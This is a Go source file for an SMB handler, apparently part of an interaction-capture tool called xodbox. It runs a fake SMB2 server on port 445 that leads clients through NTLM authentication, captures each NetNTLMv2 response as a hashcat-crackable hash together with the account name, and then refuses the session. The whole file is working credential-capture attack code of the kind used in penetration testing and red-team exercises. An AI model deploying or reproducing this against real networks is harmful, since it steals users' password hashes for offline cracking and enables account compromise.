package smb

import (
	"context"
	"errors"
	"fmt"
	"io"
	"net"
	"sync"

	"github.com/defektive/xodbox/pkg/types"
)

// Handler is a fake SMB server. It speaks just enough SMB2 to walk a
// client through NTLM authentication and capture the resulting
// NetNTLMv2 response as a hashcat-crackable hash. It never grants a
// session — every authentication attempt is answered with a logon
// failure once the hash has been recorded.
type Handler struct {
	name            string
	Listener        string
	TargetName      string
	dispatchChannel chan types.InteractionEvent

	mu       sync.Mutex
	listener net.Listener
	stopping bool
	conns    map[net.Conn]struct{}
	done     chan struct{}
}

func NewHandler(handlerConfig map[string]string) types.Handler {
	listener := handlerConfig["listener"]
	if listener == "" {
		listener = ":445"
	}

	targetName := handlerConfig["target_name"]
	if targetName == "" {
		targetName = defaultTargetName
	}

	return &Handler{
		name:       "SMB",
		Listener:   listener,
		TargetName: targetName,
	}
}

func (h *Handler) Name() string {
	return h.name
}

func (h *Handler) Start(app types.App, eventChan chan types.InteractionEvent) error {
	h.dispatchChannel = eventChan
	lg().Info("Starting SMB Server", "listener", h.Listener)

	l, err := net.Listen("tcp4", h.Listener)
	if err != nil {
		return fmt.Errorf("smb listen %q: %w", h.Listener, err)
	}
	h.mu.Lock()
	h.listener = l
	h.stopping = false
	h.conns = make(map[net.Conn]struct{})
	h.done = make(chan struct{})
	h.mu.Unlock()
	defer l.Close()

	for {
		c, err := l.Accept()
		if err != nil {
			h.mu.Lock()
			stopping := h.stopping
			h.mu.Unlock()
			if stopping {
				return nil
			}
			return err
		}
		go h.handleConn(c)
	}
}

// Stop mirrors the tcp handler: it closes the listening socket so the
// accept loop exits, then closes every in-flight connection so blocked
// reads return and their goroutines exit. Safe to call multiple times
// and before Start.
func (h *Handler) Stop(ctx context.Context) error {
	h.mu.Lock()
	if h.stopping {
		h.mu.Unlock()
		return nil
	}
	h.stopping = true
	l := h.listener
	h.listener = nil
	if h.done != nil {
		close(h.done)
	}
	conns := make([]net.Conn, 0, len(h.conns))
	for c := range h.conns {
		conns = append(conns, c)
	}
	h.mu.Unlock()

	for _, c := range conns {
		_ = c.Close()
	}

	if l == nil {
		return nil
	}
	return l.Close()
}

// handleConn drives one client through the negotiate/session-setup dance
// and captures its NetNTLMv2 hash. It emits Connect on accept and
// Disconnect when the exchange ends.
func (h *Handler) handleConn(c net.Conn) {
	defer c.Close()
	lg().Debug("Accepted SMB connection", "remote", c.RemoteAddr().String())

	h.mu.Lock()
	done := h.done
	if h.conns != nil {
		h.conns[c] = struct{}{}
	}
	h.mu.Unlock()
	defer func() {
		h.mu.Lock()
		delete(h.conns, c)
		h.mu.Unlock()
	}()

	h.send(done, NewEvent(c, Connect, nil))
	defer h.send(done, NewEvent(c, Disconnect, nil))

	negotiated := false
	for {
		msg, err := readPacket(c)
		if err != nil {
			if !errors.Is(err, io.EOF) {
				lg().Debug("smb read finished", "err", err)
			}
			return
		}

		switch {
		case isSMB1(msg):
			// Legacy multi-protocol negotiate: answer with an SMB2
			// wildcard so the client re-negotiates over SMB2.
			if err := writePacket(c, buildNegotiateResponse(0, dialectWildcard)); err != nil {
				return
			}

		case isSMB2(msg):
			switch smb2Command(msg) {
			case cmdNegotiate:
				if !negotiated {
					negotiated = true
					h.send(done, NewEvent(c, Negotiate, nil))
				}
				resp := buildNegotiateResponse(smb2MessageID(msg), selectDialect(msg))
				if err := writePacket(c, resp); err != nil {
					return
				}

			case cmdSessionSetup:
				if h.handleSessionSetup(c, done, msg) {
					return
				}

			default:
				// Anything past authentication we don't implement.
				return
			}

		default:
			return
		}
	}
}

// handleSessionSetup processes one SESSION_SETUP request. It returns true
// when the connection is finished with (a hash was captured, or the
// message was unusable), false to keep reading.
func (h *Handler) handleSessionSetup(c net.Conn, done <-chan struct{}, msg []byte) (finished bool) {
	mid := smb2MessageID(msg)
	ntlm := findNTLMSSP(sessionSetupSecBuf(msg))

	switch ntlmMessageType(ntlm) {
	case ntlmNegotiate:
		// Client kicked off NTLM: hand back our challenge and ask for more.
		secBuf := buildNegTokenResp(buildChallenge(h.TargetName))
		resp := buildSessionSetupResponse(mid, statusMoreProcessingReqd, secBuf)
		if err := writePacket(c, resp); err != nil {
			return true
		}
		return false

	case ntlmAuthenticate:
		info, err := parseAuthenticate(ntlm)
		if err != nil {
			lg().Debug("smb ntlm parse failed", "err", err)
		} else {
			hash := info.HashcatLine()
			lg().Info("captured NetNTLMv2", "account", info.Account())
			ev := NewEvent(c, Auth, []byte(hash))
			ev.Account = info.Account()
			h.send(done, ev)
		}
		// We never actually grant the session.
		_ = writePacket(c, buildSessionSetupResponse(mid, statusLogonFailure, nil))
		return true

	default:
		return true
	}
}

// send delivers an event without blocking past shutdown: once Stop closes
// done, a send parked on a full dispatch channel is abandoned so the
// goroutine can exit instead of leaking.
func (h *Handler) send(done <-chan struct{}, e types.InteractionEvent) {
	select {
	case h.dispatchChannel <- e:
	case <-done:
	}
}
